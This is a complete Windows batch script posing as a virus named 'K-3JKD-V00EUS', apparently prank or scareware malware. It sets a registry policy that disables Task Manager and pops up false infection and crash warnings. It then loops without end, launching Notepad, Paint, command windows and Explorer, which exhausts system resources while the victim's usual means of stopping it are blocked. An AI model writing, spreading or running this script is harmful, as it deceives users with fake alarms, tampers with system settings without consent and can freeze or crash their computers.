@echo off
title SYSTEM FAILURE - K-3JKD-V00EUS
color 4
mode 100
cls

:: Disable Task Manager temporarily
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul

:: Hide cursor
echo | set /p=".">nul
echo Hiding cursor...
echo off
timeout /t 2 /nobreak >nul

:: Fake Error Messages
msg * "WARNING: Suspicious activity detected!"
msg * "Your system is infected with K-3JKD-V00EUS!"
msg * "Attempting to remove virus... FAILED!"
msg * "System crash is imminent..."

:: Screen Glitch Effect
:start
start notepad
start mspaint
start cmd /k "echo CRITICAL SYSTEM FAILURE!"
start explorer
timeout /t 1 /nobreak >nul
goto start
